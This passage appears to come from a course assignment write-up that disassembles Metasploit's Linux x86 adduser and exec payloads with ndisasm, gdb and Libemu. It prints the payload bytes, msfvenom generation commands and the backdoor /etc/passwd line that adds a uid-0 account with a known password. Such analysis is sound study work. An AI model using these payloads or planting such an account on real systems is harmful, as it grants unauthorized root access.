<p style="text-align:justify;">These bytecodes are actually representing the code between offset <strong>0000002B</strong> and offset <strong>00000053</strong> where the execution is redirected from instruction <strong>call 0x53</strong> as seen from <strong>ndisasm</strong> output below.</p>
<pre><strong>0000002B</strong> <span style="color:#ff0000;">6D</span>               insd
0000002C <span style="color:#ff0000;">657461</span>           gs jz 0x90
0000002F <span style="color:#ff0000;">7370</span>             jnc 0xa1
00000031 <span style="color:#ff0000;">6C</span>               insb
00000032 <span style="color:#ff0000;">6F</span>               outsd
00000033 <span style="color:#ff0000;">69743A417A2F6449</span> imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B <span style="color:#ff0000;">736A</span>             jnc 0xa7
0000003D <span style="color:#ff0000;">3470</span>             xor al,0x70
0000003F <span style="color:#ff0000;">3449</span>             xor al,0x49
00000041 <span style="color:#ff0000;">52</span>               push edx
00000042 <span style="color:#ff0000;">633A</span>             arpl [edx],di
00000044 <span style="color:#ff0000;">303A</span>             xor [edx],bh
00000046 <span style="color:#ff0000;">303A</span>             xor [edx],bh
00000048 <span style="color:#ff0000;">3A2F</span>             cmp ch,[edi]
0000004A <span style="color:#ff0000;">3A2F</span>             cmp ch,[edi]
0000004C <span style="color:#ff0000;">62696E</span>           bound ebp,[ecx+0x6e]
0000004F <span style="color:#ff0000;">2F</span>               das
00000050 <span style="color:#ff0000;">7368</span>             jnc 0xba
00000052 <span style="color:#ff0000;">0A598B</span>           or bl,[ecx-0x75]</pre>
<p style="text-align:justify;">The following output shows that if we convert the hex opcodes highlighted with red colour above into ASCII text, we can have a new user record in valid format that can be inserted into the file <strong>/etc/passwd</strong>. Moreover with little help of python we can have a valid record in text as seen below</p>
<pre>"6D65746173706C6F69743A417A2F6449736A3470344952633A303A303A3A2F3A2F62696E2F73680A598B".decode("hex")
'<span style="color:#ff0000;">metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</span><span style="color:#33cccc;">\n</span>Y\x8b'</pre>
<p style="text-align:justify;">Also as we see above, the default credentials are used because we didn't provide any username or password to the <strong>msfvenom</strong> command, so the username will be <strong>metasploit</strong>, and the password will be <strong>Az/dIsj4p4IRc</strong> . Furthermore the user id as well as the group id will be <strong>0</strong> and the login shell will be <strong>/bin/sh</strong>. The following output from <strong>gdb-peda</strong> can provide us with the expected results as discussed before. As we see in red color below the flow has been redirected at instruction <strong>pop ecx </strong>after the <strong>call 0x53 </strong>is executed.</p>
<pre>=&gt; 0x404093 &lt;shellcode+83&gt;:   <span style="color:#ff0000;">pop    ecx</span>
   0x404094 &lt;shellcode+84&gt;:   mov    edx,DWORD PTR [ecx-0x4]
   0x404097 &lt;shellcode+87&gt;:   push   0x4
   0x404099 &lt;shellcode+89&gt;:   pop    eax</pre>
<p style="text-align:justify;">if we examine closely the address <strong>0x404090 </strong>we see the following hexadecimal values in red</p>
<pre><strong>gdb-peda$ x/20x 0x404090</strong>
0x404090 &lt;shellcode+80&gt;: <span style="color:#ff0000;">0x59 0x8b 0x51 0xfc 0x6a 0x04 0x58 0xcd</span>
0x404098 &lt;shellcode+88&gt;: <span style="color:#ff0000;">0x80 0x6a 0x01 0x58 0xcd 0x80 </span>0x00 0x00
0x4040a0: 0x00 0x00 0x00 0x00
gdb-peda$</pre>
<p style="text-align:justify;">if we look closely at the snippet below we see the above hexadecimal values presented in the second column of the <strong>ndisasm</strong> output</p>
<pre>00000052 0A<span style="color:#ff0000;">598B</span> or bl,[ecx-0x75] 
00000055 <span style="color:#ff0000;">51</span>     push ecx 
00000056 <span style="color:#ff0000;">FC</span>     cld 
00000057 <span style="color:#ff0000;">6A04</span>   push byte +0x4 
00000059 <span style="color:#ff0000;">58</span>     pop eax 
0000005A <span style="color:#ff0000;">CD80</span>   int 0x80 
0000005C <span style="color:#ff0000;">6A01</span>   push byte +0x1 
0000005E <span style="color:#ff0000;">58</span>     pop eax 
0000005F <span style="color:#ff0000;">CD80</span>   int 0x80</pre>
<p style="text-align:justify;">in such case we can also use python to convert the opcodes in ASCII text in order to reveal the assembly code</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># echo -ne "\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -b 32 -p intel -
00000000 59     pop ecx
00000001 8B51FC mov edx,[ecx-0x4]
00000004 6A04   push byte +0x4
00000006 58     pop eax
00000007 CD80   int 0x80
00000009 6A01   push byte +0x1
0000000B 58     pop eax
0000000C CD80   int 0x80</pre>
<p style="text-align:justify;">The <strong>pop ecx</strong> instruction above will store the string in <strong>ecx</strong> register</p>
<pre><strong>metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</strong></pre>
<p style="text-align:justify;">Also from <strong>gdb-peda </strong>we get the output below</p>
<pre>gdb-peda$ x/s $ecx
0x40406b &lt;shellcode+43&gt;: "<span style="color:#ff0000;">metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</span>\nY\213Q\374j\004X\315\200j\001X\315\200"</pre>
<p style="text-align:justify;">Then the instruction <strong>mov edx, [ecx-0x4]</strong> will move the value <strong>0x28 </strong>into<strong> edx </strong>register</p>
<pre><strong>mov edx,[ecx-0x4]       <span style="color:#33cccc;">; move 0x28 into edx register </span></strong></pre>
<p style="text-align:justify;">In detail, if we check the <strong>ndisasm</strong> output we see that the instruction right after the <strong>call 0x53</strong> instruction appears to be at offset <strong>0000002B</strong>. Moreover, the<strong> ecx</strong> register after the <strong>pop ecx</strong> instruction holds the opcodes at offset <strong>0000002B</strong> because as we know the <strong>call</strong> instruction pushes the memory address of the next instruction on the stack. The<strong> edx </strong>register will now hold the contents in memory address<strong> 00000027</strong> <strong>( 0x2B - 0x4 ). </strong>Also from <strong>gdb</strong> we can confirm that <strong>0x28</strong>&nbsp;is present in <strong>[ecx-4]</strong> as seen below</p>
<pre>gdb-peda$ <strong>x/x $ecx</strong>
0x40406b &lt;shellcode+43&gt;:  <span style="color:#ff0000;">0x6d</span>
gdb-peda$ <strong>x/-4x $ecx</strong>
0x404067 &lt;shellcode+39&gt;:  <span style="color:#ff0000;">0x28</span>    0x00    0x00    0x00
gdb-peda$</pre>
<p style="text-align:justify;">The <strong>edx</strong> register will be used as the third argument of the<strong> write</strong> system call which refers to the size of the string that will be inserted inside the <strong>/etc/passwd</strong> file. The decimal value of <strong>0x28</strong> is <strong>40</strong> which indicates the size of the following string</p>
<pre style="text-align:justify;">metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</pre>
<p style="text-align:justify;">In the <strong>unistd_32.h</strong> header file the hex identifier <strong>0x4 </strong>( 4 in decimal ) specifies the <strong>write</strong> system call. The prototype of <strong>write</strong>&nbsp;is as follows</p>
<pre>#include &lt;unistd.h&gt;<b><br /><br /></b>ssize_t write(int fd, const void *buf, size_t count);</pre>
<p style="text-align:justify;">According to the man page of <strong>write</strong> system call, it writes up to <strong>count</strong> bytes from the buffer starting at <strong>buf</strong> to the file referred to by the file descriptor <strong>fd</strong>. Moreover, we can refer to the <a href="http://shell-storm.org/shellcode/files/syscalls.html">linux System Call table</a>&nbsp;in order to link the arguments of <strong>write </strong>system call with the specific general purpose registers. For example, regarding the <strong>write</strong>&nbsp;system call the <strong>ecx</strong> register refers to the third argument, the <strong>edx</strong> for the second and the <strong>ebx</strong> for the first argument and <strong>eax</strong> refers to the system call identifier which is number 4.</p>
<p style="text-align:justify;">Furthermore, as we saw from the <strong>ndisasm</strong> disassembled code output before, the file descriptor has been kept in <strong>ebx</strong> register &nbsp;when the <strong>xchg</strong> instruction were executed before the <strong>call</strong> instruction. Also as explained at the previous paragraph the <strong>ecx</strong> register holds the string value that will be placed inside the <strong>/etc/passwd</strong> file representing the second argument of the <strong>write</strong> system call. Next, the <strong>write</strong> system call identifier will be pushed on the stack and then it will be loaded into the <strong>eax</strong> register using the <strong>pop eax</strong> instruction. Then the <strong>write</strong> system call will be called using the <strong>int 0x80</strong> instruction.</p>
<pre><strong>push byte +0x4   <span style="color:#33cccc;">; push 0x4 immediate value on the stack</span> 
pop eax          <span style="color:#33cccc;">; load write syscall identifier 0x4 into eax</span> 
int 0x80         <span style="color:#33cccc;">; execute write syscall</span></strong></pre>
<p style="text-align:justify;">The <strong>write</strong> system call will be as follows</p>
<pre><strong>write(3, metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh, 40)</strong></pre>
<p style="text-align:justify;">Finally, <strong>0x1</strong> is pushed into the stack and stored in <strong>eax</strong> register using the <strong>pop eax</strong> instruction. In <strong>unistd_32.h</strong> header file the value <strong>0x1</strong> specifies the <strong>exit</strong> system call. Before we move further lets examine the <strong>exit </strong>prototype as seen below</p>
<pre><strong>#include &lt;stdlib.h&gt;

void exit(int <i>status</i>);</strong></pre>
<p style="text-align:justify;">The <strong>exit(3)</strong> syscall does not return any value but it takes only one argument, the status. As we know from previous analysis, the <strong>ebx</strong> register holds the value <strong>0x3</strong> that will be used as an argument on the <strong>exit</strong> system call which refers at&nbsp;the status of the exit process. When a program exits, it can return to the parent process a small amount of information about the cause of termination, using the exit status. This is a value between 0 and 255 that the exiting process passes as an argument to <strong>exit </strong>system call.</p>
<pre>push byte +0x1  <strong><span style="color:#33cccc;">; push 0x1 on the stack</span> </strong>
pop eax         <strong><span style="color:#33cccc;">; load exit syscall identifier 0x1 into eax</span></strong>
int 0x80        <strong><span style="color:#33cccc;">; execute exit syscall</span></strong></pre>
<p style="text-align:justify;">The software interrupt is then performed by the <strong>int 0x80</strong> instruction where used to call the <strong>exit</strong> system call in order to terminate the program.</p>
<pre><strong>exit(3)</strong></pre>
<p style="text-align:justify;">To summarise, from the <strong>adduser</strong> shellcode analysis the following system calls are used</p>
<pre><strong>setreuid(0, 0)
open(/etc//passwd, O_WRONLY|O_APPEND)
write(3, metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh, 40)
exit(3)</strong></pre>
<h3>&nbsp;</h3>
<h2><span style="color:#339966;">2nd Shellcode analysis - exec</span></h2>
<p style="text-align:justify;">At this section the <strong>exec</strong> shellcode will be analysed. Before we continue the analysis of the payload we will check the information provided from <strong>msfconsole.&nbsp;</strong></p>
<pre>msf5 &gt; use payload/linux/x86/exec
msf5 payload(linux/x86/exec) &gt; info

Name: Linux Execute Command
Module: payload/linux/x86/exec
Platform: Linux
Arch: x86
Needs Admin: No
Total size: 36
Rank: Normal

Provided by:
vlad902 &lt;vlad902@gmail.com&gt;

Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
CMD yes The command string to execute

Description:
Execute an arbitrary command</pre>
<p style="text-align:justify;">As we see from the description above, the <strong>exec</strong> payload is being used in order to execute an arbitrary command. Furthermore, with <strong>msfvenom</strong> the <strong>id</strong> command will be executed using <strong>exec</strong> and the output will be saved at file <strong>linux_x86_exec.c</strong> as follows</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span>#  msfvenom -p linux/x86/exec CMD="id" -f C -o linux_x86_exec.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
Final size of c file: 185 bytes
Saved as: linux_x86_exec.c</pre>
<p style="text-align:justify;">Moreover, in order to perform static analysis of the <strong>exec</strong> shellcode&nbsp;we will use the <strong>ndisasm</strong> tool which will produce the following output&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># echo -ne `cat linux_x86_exec.c | grep -v unsigned | sed 's/"//g' | sed ':a;N;$!ba;s/\n//g' | sed 's/^"//;$s/;//'` | ndisasm -u -
00000000 6A0B             push byte +0xb
00000002 58               pop eax
00000003 99               cdq
00000004 52               push edx
00000005 66682D63         push word 0x632d
00000009 89E7             mov edi,esp
0000000B 682F736800       push dword 0x68732f
00000010 682F62696E       push dword 0x6e69622f
00000015 89E3             mov ebx,esp
00000017 52               push edx
00000018 E803000000       call 0x20
0000001D 696400575389E1CD imul esp,[eax+eax+0x57],dword 0xcde18953
00000025 80               db 0x80</pre>
<p style="text-align:justify;">As seen below, the first instruction used to push <strong>0xb</strong> ( 11 in decimal ) into the stack&nbsp;</p>
<pre style="text-align:justify;"><strong>push byte +0xb   <span style="color:#33cccc;">; push 0xb ( 11 in decimal ) on the stack</span></strong></pre>
<p style="text-align:justify;">If we search for the hex value <strong>0xb</strong> ( 11 in decimal ) at the header file <strong>unistd_32.h</strong>&nbsp;we can see that the <strong>execve</strong> syscall has been defined with that value.</p>
<pre style="text-align:justify;"><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 11$"
#define __NR_execve 11</pre>
<p style="text-align:justify;">Below is the <strong>execve</strong> syscall synopsis</p>
<pre><b>#include &lt;unistd.h&gt;</b>

<b>int execve(const char *</b><i>pathname</i><b>, char *const </b><i>argv</i><b>[],</b> <b>char *const </b><i>envp</i><b>[]);  
</b></pre>
<p style="text-align:justify;">As we see <strong>execve</strong> syscall takes three arguments. According to the man page, the <b>execv</b><strong>e</strong>&nbsp;syscall executes the program referred to by <strong>pathname</strong>. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialised stack, heap, and (initialised and uninitialised) data segments. <strong><i>argv[]</i></strong> is an array of pointers to strings passed to the new program as its command-line arguments. <strong><i>envp</i></strong> is an array of pointers to strings, conventionally of the form <b>key=value</b>, which are passed as the environment of the new program. The <strong><i>envp</i></strong> array must be terminated by a NULL pointer. Afterwards, the second instruction is used to save the hex value <strong>0xb </strong>into the <strong>eax</strong> register</p>
<pre><strong>pop eax   </strong><span style="color:#33cccc;"><strong>; load 0xb on eax register</strong> </span></pre>
<p style="text-align:justify;">The next instruction <strong>cdq</strong> extends the sign bit of <strong>eax</strong> into the <strong>edx</strong> register. This means that if the sign bit is zero as indicated by the flag&nbsp; <strong>SF = 0</strong>, then the extension of <strong>edx</strong> register will be <strong>0x00000000. </strong>This is an alternative way of zeroing out<strong> edx </strong>register. Regarding the placement of the syscall arguments we are starting from left to right, and at this point <strong>edx</strong> is simply <strong>0x0</strong> because the <strong>char * envp[]</strong>&nbsp; argument is null. Then <strong>edx</strong> pushed into the stack with <strong>push edx</strong> instruction</p>
<pre><strong>cdq       <span style="color:#33cccc;">; extend the sign bit of eax into the edx register</span>
push edx  </strong><span style="color:#33cccc;"><strong>; push edx on the stack</strong> </span></pre>
<p style="text-align:justify;">Furthermore, using python we can transform the hex value <strong>0x632d </strong>into the equivalent ASCII text representation as seen below</p>
<pre>Python 3.7.5 (default, Oct 27 2019, 15:43:29)
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; bytes.fromhex('632d').decode('utf-8')
'c-'</pre>
<p style="text-align:justify;">the following instruction pushes the 2 byte data item <strong>"c-"</strong> or <strong>"-c"</strong> in reverse order inside the stack</p>
<pre><strong>push word 0x632d <span style="color:#33cccc;">; push 2 byte data item 'c-' on the stack</span></strong></pre>
<p style="text-align:justify;">With the following instruction the contents pointed by the stack pointer will be loaded inside <strong>edi</strong> register. As we saw before the last instruction pushed the characters <strong>"c-"</strong> on the stack, where the <strong>esp</strong> register is now pointing.</p>
<pre style="text-align:justify;"><strong> mov edi,esp  <span style="color:#33cccc;">; load the contents pointed by the stack pointer to edi</span></strong></pre>
<p style="text-align:justify;">Afterwards, using python we can provide the ASCII text representation of hex values <strong>0x68732f</strong> and <strong>0x6e69622f</strong> that are pushed on the stack</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29)
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; bytes.fromhex('68732f').decode('utf-8')
'hs/'
&gt;&gt;&gt; bytes.fromhex('6e69622f').decode('utf-8')
'nib/'
&gt;&gt;&gt;</pre>
<p style="text-align:justify;">From the python output above we can see that a 4 bytes data item <strong>'/bin/sh'</strong> pushed inside the stack using the following two instructions below</p>
<pre><strong>push dword 0x68732f    <span style="color:#33cccc;">; push 'hs/' on the stack</span> 
push dword 0x6e69622f  <span style="color:#33cccc;">;</span> <span style="color:#33cccc;">push 'nib/' on the stack</span></strong></pre>
<p style="text-align:justify;">The next instruction will load the data pointed by the <strong>esp</strong> register inside the <strong>ebx</strong> register, meaning that <strong>ebx</strong> register will now point at the beginning of the string<strong> '/bin/sh'&nbsp;</strong></p>
<pre><strong>mov ebx,esp    </strong><span style="color:#33cccc;"><strong>; load the contents pointed by the stack pointer to ebx</strong> </span></pre>
<p style="text-align:justify;">The next instruction pushes four null bytes on the stack because as we saw before the <strong>cdq</strong> instruction used to zero out the <strong>edx</strong> register and still has the same value</p>
<pre><strong>push edx       </strong><span style="color:#33cccc;"><strong>; push ebx on the stack</strong> </span></pre>
<p style="text-align:justify;">As we saw at the <strong>execve</strong>&nbsp;prototype previously, the <strong>argv[]</strong> argument is a char array which consists the second argument of the <strong>execve</strong>&nbsp;syscall. As we know so far, the array consists of two elements <strong>'/bin/sh'</strong> and <strong>'-c'</strong> and because no more elements will be used it must be terminated with the null value.&nbsp; For that reason the instruction <strong>push edx</strong> used to provide the null bytes in order to null terminate the array.</p>
<p style="text-align:justify;">Afterwards, the following two instructions will be used in order to provide the first argument of the <strong>execve </strong>syscall. In detail, the <strong>call 0x20</strong> instruction will save the memory address of the next instruction on the stack and it will redirect the execution flow <strong>0x20</strong> ( 32 in decimal ) bytes from the start of the shellcode.</p>
<pre>00000018 E803000000       call 0x20 
0000001D <span style="color:#ff0000;">6964</span><span style="color:#00ff00;">00</span>575389E1CD imul esp,[eax+eax+0x57],dword 0xcde18953</pre>
<p style="text-align:justify;">As we see above the memory address pushed on the stack after the call instruction is the <strong>0000001D </strong>( 29 in decimal ). If we look closely at the offset above, we can see in red colour the bytecodes <strong>6964</strong> followed by the null byte <strong>0x00 </strong>in green colour. Using python we can see the ASCII text format of the hex value <strong>0x6964</strong>&nbsp; as shown below</p>
<pre>Python 3.7.5 (default, Oct 27 2019, 15:43:29)
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; bytes.fromhex('6964').decode('utf-8')
'id'</pre>
<p style="text-align:justify;">The null byte <strong>0x00</strong> used to terminate the string. Furthermore, as seen previously the <strong>call 0x20</strong> instruction redirects the execution flow 32 bytes from the start of the shellcode, as shown with red below</p>
<pre>0000001D 696400<span style="color:#ff0000;">575389E1CD</span> imul esp,[eax+eax+0x57],dword 0xcde18953 
00000025 <span style="color:#ff0000;">80</span>               db 0x80</pre>
<p style="text-align:justify;">if we disassemble the shellcode <strong>\x57\x53\x89\xE1\xCD\x80</strong> with <strong>ndisasm</strong> we will have the following output</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># echo -ne "\x57\x53\x89\xE1\xCD\x80" | ndisasm -u -
00000000 57    push edi
00000001 53    push ebx
00000002 89E1  mov ecx,esp
00000004 CD80  int 0x80</pre>
<p style="text-align:justify;">The two instructions above <strong>push edi</strong> and <strong>push ebx</strong> will push the memory addresses of the two registers <strong>edi</strong> and <strong>ebx </strong>on the stack. The registers <strong>edi </strong>and<strong> ebx</strong>&nbsp;represent the array elements of the second <strong>execve</strong> argument. In detail, the <strong>push edi</strong> register will push the memory address of the <strong>edi</strong> register on the stack which contains the string <strong>"-c"</strong> and afterwards the <strong>push ebx</strong> instruction will push the memory address of the <strong>ebx</strong> register on the stack which contains the string <strong>"/bin/sh". </strong>Because the memory address of<strong> ebx </strong>register is the last one pushed on the stack, the contents of <strong>ebx</strong> will be located at the top of the stack where the <strong>esp</strong> register is pointing. Furthermore, the <strong>ecx</strong> register which refers to the second argument of the <strong>execve</strong> system call will contain the string <strong>"/bin/sh"</strong>&nbsp;after the <strong>mov ecx, esp</strong> instruction executes. Regarding the first argument of <strong>execve</strong> system call, the memory address that contains the <strong>"id"</strong> string is already on the stack. Then the<strong> execve</strong> system call will be executed calling the <strong>int 0x80</strong> instruction issuing a software interrupt forcing the kernel to handle the interrupt. The kernel first checks the parameters for correctness, and then copies the register values to kernel memory space and handles the interrupt by referring to the Interrupt Descriptor Table (IDT). When the <strong>execve </strong>system call is called the following command will be executed</p>
<pre><strong>/bin/sh -c id</strong></pre>
<p style="text-align:justify;">To summarise, from the <strong>exec</strong> shellcode analysis the following system call is being used.</p>
<pre><strong>execve("/bin/sh", ["/bin/sh", "-c", "id"], NULL)</strong></pre>
<p style="text-align:justify;">Besides the shelcode analysis with <strong>ndisasm</strong> and <strong>gdb</strong> another useful tool called <strong>Libemu </strong>can be used to perform shellcode analysis.<strong> Libemu</strong> is a small library written in C and offers basic x86 emulation and shellcode detection and analysis. Instead of going through the instructions we can use <strong>Libemu</strong> which can provide us with a visual perspective of the execution flow&nbsp;</p>
<p style="text-align:justify;">first we will create the binary with <strong>msfvenom</strong> as follows&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># msfvenom -p linux/x86/exec CMD=id -a x86 --platform=linux -f raw -o linux_exec.bin<br />No encoder or badchars specified, outputting raw payload<br />Payload size: 38 bytes<br />Saved as: linux_exec.bin</pre>
<p style="text-align:justify;">Then we will use Libemu as follows&nbsp;</p>
<pre><span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment5</b></span># sctest -vvv -Ss 10000 -G linux_exec.dot &lt; linux_exec.bin<br />graph file linux_exec.dot<br />verbose = 3<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417000<br />[emu 0x0x2123610 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417000<br />[emu 0x0x2123610 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 6A0B push byte 0xb<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417002<br />[emu 0x0x2123610 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 58 pop eax<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417003<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 99 cwd<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417004<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 52 push edx<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417005<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 66682D63 push word 0x632d<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417009<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fc8 ebp=0x00000000 esi=0x00000000 edi=0x00000000<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 89E7 mov edi,esp<br />[emu 0x0x2123610 debug ] cpu state eip=0x0041700b<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fc8 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 682F736800 push dword 0x68732f<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417010<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fc4 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 682F62696E push dword 0x6e69622f<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417015<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00000000<br />[emu 0x0x2123610 debug ] esp=0x00416fc0 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 89E3 mov ebx,esp<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417017<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fc0 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 52 push edx<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417018<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fbc ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] E8 call 0x1<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417020<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fb8 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 57 push edi<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417021<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fb4 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 53 push ebx<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417022<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00000000 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fb0 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 89E1 mov ecx,esp<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417024<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00416fb0 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fb0 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] CD80 int 0x80<br />execve<br />int execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417026<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00416fb0 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fb0 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8<br />[emu 0x0x2123610 debug ] Flags:<br />[emu 0x0x2123610 debug ] 0000 add [eax],al<br />cpu error error accessing 0x00000004 not mapped<br /><br />stepcount 15<br />copying vertexes<br />optimizing graph<br />vertex 0x21837d0<br />going forwards from 0x21837d0<br />-&gt; vertex 0x21839f0<br />-&gt; vertex 0x2183ae0<br />-&gt; vertex 0x2183bc0<br />-&gt; vertex 0x2183db0<br />-&gt; vertex 0x2184010<br />-&gt; vertex 0x2184160<br />-&gt; vertex 0x21842c0<br />-&gt; vertex 0x21844c0<br />-&gt; vertex 0x2184680<br />-&gt; vertex 0x21847d0<br />-&gt; vertex 0x2184940<br />-&gt; vertex 0x2184ab0<br />-&gt; vertex 0x2184c20<br />copying edges for 0x2184c20<br />-&gt; 0x2188600<br />vertex 0x2184d90<br />going forwards from 0x2184d90<br />copying edges for 0x2184d90<br />vertex 0x2184ec0<br />going forwards from 0x2184ec0<br />copying edges for 0x2184ec0<br />[emu 0x0x2123610 debug ] cpu state eip=0x00417028<br />[emu 0x0x2123610 debug ] eax=0x0000000b ecx=0x00416fb0 edx=0x00000000 ebx=0x00416fc0<br />[emu 0x0x2123610 debug ] esp=0x00416fb0 